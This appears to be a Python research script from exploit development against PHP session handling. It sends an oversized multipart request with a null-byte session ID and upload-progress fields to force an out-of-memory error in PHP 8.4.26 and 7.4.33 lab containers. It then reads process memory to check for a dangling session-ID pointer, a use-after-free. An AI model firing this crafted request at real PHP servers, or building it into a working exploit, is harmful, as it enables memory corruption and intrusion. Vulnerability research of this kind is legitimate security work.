"""Read PS(id) + session_status on 8.4.26 and 7.4.33 AFTER the OOM request.
Hypothesis: 8.4.26 leaves PS(id) dangling (UAF); 7.4.33 frees it (clean teardown)."""
import sys, os, time, struct, subprocess
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E

CONTAINERS = {
    "8.4.26": {"container": "p2s8426", "port": 18113, "psg_off": 0x1316820},
    "7.4.33": {"container": "p2s7433", "port": 18108, "psg_off": 0xd37f80},
}
PS_ID_OFF = 0x10
PS_STATUS_OFF = 0x68

def sh(container, cmd):
    r = subprocess.run(["docker", "exec", container, "sh", "-c", cmd], capture_output=True)
    return r.stdout, r.stderr

def read_mem(container, wpid, addr, count):
    r = subprocess.run(["docker", "exec", container, "sh", "-c",
        f"dd if=/proc/{wpid}/mem bs=1 skip={addr} count={count} 2>/dev/null"], capture_output=True)
    return r.stdout

def get_worker_pid(container):
    out, _ = sh(container, "ps aux | grep apache2 | grep www-data | grep -v grep | awk '{print $2}' | head -1")
    return out.decode().strip()

def get_libphp_base(container, wpid):
    out, _ = sh(container, f"grep libphp /proc/{wpid}/maps | head -1")
    line = out.decode().strip()
    return int(line.split("-")[0], 16) if line else 0

def fire_oom(port):
    t = E.Target(f"http://127.0.0.1:{port}/", timeout=90.0, verbose=False)
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (12 * 1024 * 1024)},
    ]
    try:
        resp = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=90.0)
        oom = b"Allowed memory size" in resp or b"Fatal error" in resp
        return oom
    except Exception:
        return False

def interpret_zend_string(raw24):
    if len(raw24) < 24:
        return "short"
    rc = struct.unpack_from("<H", raw24, 0)[0]
    typ = struct.unpack_from("<H", raw24, 2)[0]
    h = struct.unpack_from("<Q", raw24, 8)[0]
    ln = struct.unpack_from("<Q", raw24, 16)[0]
    return f"rc={rc} type=0x{typ:x} h=0x{h:x} len={ln}"

for ver, cfg in CONTAINERS.items():
    container = cfg["container"]
    port = cfg["port"]
    print(f"\n########## {ver} ##########", flush=True)
    wpid = get_worker_pid(container)
    base = get_libphp_base(container, wpid)
    psg = base + cfg["psg_off"]
    print(f"  worker={wpid} libphp=0x{base:x} ps_globals=0x{psg:x}", flush=True)

    oom = fire_oom(port)
    print(f"  OOM request: oom_visible={oom}", flush=True)
    time.sleep(0.6)

    # Read PS(id) pointer + session_status
    psid_ptr_raw = read_mem(container, wpid, psg + PS_ID_OFF, 8)
    status_raw = read_mem(container, wpid, psg + PS_STATUS_OFF, 4)
    if len(psid_ptr_raw) == 8:
        psid_ptr = struct.unpack("<Q", psid_ptr_raw)[0]
        print(f"  PS(id) = 0x{psid_ptr:x}", flush=True)
        if psid_ptr:
            # Read the zend_string header it points to
            hdr = read_mem(container, wpid, psid_ptr, 32)
            print(f"  *PS(id) zend_string: {interpret_zend_string(hdr)}", flush=True)
            print(f"  *PS(id) data[0:24]: {hdr[24:32].hex() if len(hdr)>=32 else hdr.hex()}", flush=True)
        else:
            print("  PS(id) = NULL (freed/clean)", flush=True)
    if len(status_raw) == 4:
        ss = struct.unpack("<i", status_raw)[0]
        print(f"  session_status = {ss} (0=disabled 1=none 2=active)", flush=True)
    time.sleep(0.5)
